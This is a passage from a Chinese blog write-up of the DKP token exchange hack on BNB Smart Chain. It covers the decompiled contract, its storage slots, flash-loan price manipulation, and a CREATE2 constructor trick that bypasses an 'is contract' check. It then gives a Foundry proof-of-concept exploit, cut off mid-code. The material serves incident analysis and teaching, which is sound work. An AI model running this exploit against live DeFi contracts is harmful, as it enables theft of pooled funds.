+</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="n">_SafeDiv</span><span class="p">(</span><span class="n">varg1</span><span class="p">,</span> <span class="n">varg0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也就是说, 其先查询了<code>_lp</code>在<code>stor_3_0_19</code>和<code>_usdt</code>这两个token上的余额, 然后返回值是两个数相除, 嗯, 嗅到了不安全的味道~</p>
+<p>继续搞清楚<code>_lp</code> ,<code>stor_3_0_19</code>和<code>_usdt</code>  分别指的什么:</p>
+<p>查看反编译代码的开头部分</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">uint160 _lp; // STORAGE[0x1] bytes 0 to 19
+</span></span><span class="line"><span class="cl">address _usdt; // STORAGE[0x2] bytes 0 to 19
+</span></span><span class="line"><span class="cl">address stor_3_0_19; // STORAGE[0x3] bytes 0 to 19
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>它们分别在slot1, slot2, solt3, 为了读出他们值,我们利用一下小工具: <a href="https://github.com/yinhui1984/GetStorageAt" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/GetStorageAt</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-apl" data-lang="apl"><span class="line"><span class="cl"><span class="o">~</span><span class="na">/</span><span class="nv">Doc</span><span class="na">/</span><span class="nv">github</span><span class="na">/</span><span class="nv">hac</span><span class="na">/</span><span class="nv">DKPDemo</span> <span class="err">❯</span> <span class="nv">getstorageat</span> <span class="m">0x89257A52Ad585Aacb1137fCc8abbD03a963B9683</span> <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Using</span> <span class="nv">provider</span><span class="bp">:</span> <span class="nv">RPC</span> <span class="nv">connection</span> <span class="nv">http</span><span class="bp">:</span><span class="na">//</span><span class="m">127.0.0.1</span><span class="bp">:</span><span class="m">8545</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">HEX</span><span class="bp">:</span>     <span class="m">0x000000000000000000000000be654fa75bad4fd82d3611391fda6628bb000cc7</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">INT</span><span class="bp">:</span>     <span class="m">1086967560541184621808388775946026158076085669063</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">BYTES</span><span class="bp">:</span>   <span class="nv">b</span><span class="s1">&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbeeO\xa7[\xadO\xd8-6\x119\x1f\xdaf(\xbb\x00\x0c\xc7&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">STRING</span><span class="bp">:</span>  <span class="nv">Not</span> <span class="nv">a</span> <span class="nv">string</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">ADDRESS</span><span class="bp">:</span> <span class="m">0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7</span>
+</span></span><span class="line"><span class="cl"><span class="o">~</span><span class="na">/</span><span class="nv">Doc</span><span class="na">/</span><span class="nv">github</span><span class="na">/</span><span class="nv">hac</span><span class="na">/</span><span class="nv">DKPDemo</span> <span class="err">❯</span> <span class="nv">getstorageat</span> <span class="m">0x89257A52Ad585Aacb1137fCc8abbD03a963B9683</span> <span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Using</span> <span class="nv">provider</span><span class="bp">:</span> <span class="nv">RPC</span> <span class="nv">connection</span> <span class="nv">http</span><span class="bp">:</span><span class="na">//</span><span class="m">127.0.0.1</span><span class="bp">:</span><span class="m">8545</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">HEX</span><span class="bp">:</span>     <span class="m">0x00000000000000000000000055d398326f99059ff775485246999027b3197955</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">INT</span><span class="bp">:</span>     <span class="m">489982930986835137684486657990555633941558688085</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">BYTES</span><span class="bp">:</span>   <span class="nv">b</span><span class="s2">&#34;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00U\xd3\x982o\x99\x05\x9f\xf7uHRF\x99\x90&#39;\xb3\x19yU&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">STRING</span><span class="bp">:</span>  <span class="nv">Not</span> <span class="nv">a</span> <span class="nv">string</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">ADDRESS</span><span class="bp">:</span> <span class="m">0x55d398326f99059fF775485246999027B3197955</span>
+</span></span><span class="line"><span class="cl"><span class="o">~</span><span class="na">/</span><span class="nv">Doc</span><span class="na">/</span><span class="nv">github</span><span class="na">/</span><span class="nv">hac</span><span class="na">/</span><span class="nv">DKPDemo</span> <span class="err">❯</span> <span class="nv">getstorageat</span> <span class="m">0x89257A52Ad585Aacb1137fCc8abbD03a963B9683</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Using</span> <span class="nv">provider</span><span class="bp">:</span> <span class="nv">RPC</span> <span class="nv">connection</span> <span class="nv">http</span><span class="bp">:</span><span class="na">//</span><span class="m">127.0.0.1</span><span class="bp">:</span><span class="m">8545</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">HEX</span><span class="bp">:</span>     <span class="m">0x000000000000000000000000d06fa1ba7c80f8e113c2dc669a23a9524775cf19</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">INT</span><span class="bp">:</span>     <span class="m">1189959551584444714248724787054917716618572582681</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">BYTES</span><span class="bp">:</span>   <span class="nv">b</span><span class="s1">&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd0o\xa1\xba|\x80\xf8\xe1\x13\xc2\xdcf\x9a#\xa9RGu\xcf\x19&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">STRING</span><span class="bp">:</span>  <span class="nv">Not</span> <span class="nv">a</span> <span class="nv">string</span>
+</span></span><span class="line"><span class="cl"><span class="nv">AS</span> <span class="nv">ADDRESS</span><span class="bp">:</span> <span class="m">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>分别是3个地址</p>
+<p><a href="https://bscscan.com/address/0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7" target="_blank" rel="noopener noreffer ">0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7</a>  : PancakeSwapV2 上的一个PAIR</p>
+<p><a href="https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955" target="_blank" rel="noopener noreffer ">0x55d398326f99059fF775485246999027B3197955 </a> : BUSD</p>
+<p><a href="https://bscscan.com/address/0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19" target="_blank" rel="noopener noreffer ">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</a>  : DKP token</p>
+<p>也就是说<code>0x1201()</code>函数,  查询了 PancakeSwapV2 上的一个PAIR的 BUSD 和 DKP 余额, 然后将余额相除并返回. 继续研究代码发现<code>exchange()</code>函数就是用的这个<code>0x1201()</code>函数进行的价格查询,以便将一定数量的美元换成DKP 给用户 (实际就是实现了一个买币函数)</p>
+<p>这就给了黑客价格操纵的机会.</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="价格操纵">价格操纵</h3>
+<p>日常操作, 利用闪电贷在<code>0x1201()</code>查询价格时用到的PAIR中借走绝大多数BUSD, 让DKP token价格异常便宜. 就可以用少量的BUSD进行大量买入.</p>
+<h3 id="绕过合约检查">绕过合约检查</h3>
+<p>由于<code>exchange</code>函数中  <code>require(msg.sender.code.size &lt;= 0, Error('no isContract'));</code> 条件的限制, 攻击合约是不能直接调用<code>exchange</code>函数的.</p>
+<p>但是, 使用代码size是否为0来作为调用是否来自合约的判断条件是有问题的. 合约在&quot;run time&quot;时代码size是大于0的,但在&quot;creation time&quot;,由于合约还正在部署过程中,所以其code size这时为0, 要在&quot;creation time&quot;执行代码逻辑,那自然就是合约的构造函数, 所以在合约的构造函数中调用<code>exchange</code>函数是可以绕过上面的条件检查的. 关于这个问题可以参考 <a href="https://github.com/yinhui1984/EthernautGameReferenceAnswers/blob/main/15_GatekepperTwo.md" target="_blank" rel="noopener noreffer ">Ethernaut第15个挑战题目</a></p>
+<p>另外一个问题是,  调用<code>exchange</code>需要钱(去买DKP), 如何在合约还没部署完成时向合约转账,让它有钱呢.</p>
+<p>所以需要事先知道合约的地址, 向其转账,然后再部署合约,部署合约时再其构造函数中进行<code>exchange</code>调用.</p>
+<p>这就需要用到Create2: <a href="https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2" target="_blank" rel="noopener noreffer ">https://github.com/yinhui1984/SolidityReference/blob/main/docs/new.md#create2</a></p>
+<h2 id="poc">POC</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: SEE LICENSE IN LICENSE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">decimals</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IUniswapV2Pair</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount0Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount1Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IRouter</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amountIn</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amountOutMin</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="n">calldata</span> <span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deadline</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IDKPExchange</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">exchange</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IERC20</span> <span class="k">constant</span> <span class="n">DKP</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0xd06fa1BA7c80F8e113c2dc669A23A9524775cF19</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">IERC20</span> <span class="k">constant</span> <span class="n">BUSD</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">IUniswapV2Pair</span> <span class="k">constant</span> <span class="n">Pair</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xBE654FA75bAD4Fd82D3611391fDa6628bB000CC7</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">IRouter</span> <span class="k">constant</span> <span class="n">Router</span> <span class="o">=</span> <span class="n">IRouter</span><span class="p">(</span><span class="mh">0x10ED43C718714eb63d5aA57B78B54704E256024E</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">IDKPExchange</span> <span class="k">constant</span> <span class="n">DKPExchange</span> <span class="o">=</span> <span class="n">IDKPExchange</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x89257A52Ad585Aacb1137fCc8abbD03a963B9683</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">RunAsNotContract</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BUSD</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">DKPExchange</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DKPExchange</span><span class="p">.</span><span class="n">exchange</span><span class="p">(</span><span class="mi">100</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BUSD</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">DKPExchange</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DKP</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">DKP</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Hack</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">flashAmount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bytes32</span> <span class="n">the_salt</span> <span class="o">=</span> <span class="kt">bytes32</span><span class="p">(</span><span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;the_salt_string&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;theNet&#34;</span><span class="p">,</span> <span class="mi">26284131</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">BUSD</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">1000</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testHack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;BUSD balance at the beginning&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">BUSD</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//借走PAIR中的绝大部分BUSD，让DKP变得非常便宜
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">flashAmount</span> <span class="o">=</span> <span class="n">caculateSwapAmount</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Pair</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="n">flashAmount</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="n">flashAmount</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//兑换BUSD，贷款回调执行完成后再兑换，否则报错&#34;Pancake: LOCKED&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">DKP2BUSD</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;BUSD balance at the end&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">BUSD</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span><span class="kt">address</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//不能直接调用,其判断了调用方是否是合约，其只允许EOA进行exchange
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//DKPExchange.exchange(xxx); // 报错： &#34;no isContract&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//use this:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">calcultedAddress</span> <span class="o">=</span> <span class="n">calculteSpecialContractAddress</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BUSD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">calcultedAddress</span><span class="p">,</span> <span class="mi">100</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">**</span> <span class="n">BUSD</span><span class="p">.</span><span class="n">decimals</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">RunAsNotContract</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RunAsNotContract</span><span class="p">{</span><span class="n">salt</span><span class="o">:</span> <span class="n">the_salt</span><span class="p">}();</span> <span class="c1">// exploit in constructor
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">assert</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">==</span> <span class="n">calcultedAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">log_named_decimal_uint</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;DKP balance&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">DKP</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">            <span class="n">DKP</span><span class="p">.</span><span class="n">decimals</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//还贷款
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">returnAmount</span> <span class="o">=</span> <span class="p">(</span><span class="n">flashAmount</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">9975</span> <span class="o">+</span> <span class="mi">1000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BUSD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">Pair</span><span class="p">),</span> <span class="n">returnAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">caculateSwapAmount</span><span class="p">()</span> <span class="k">private</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
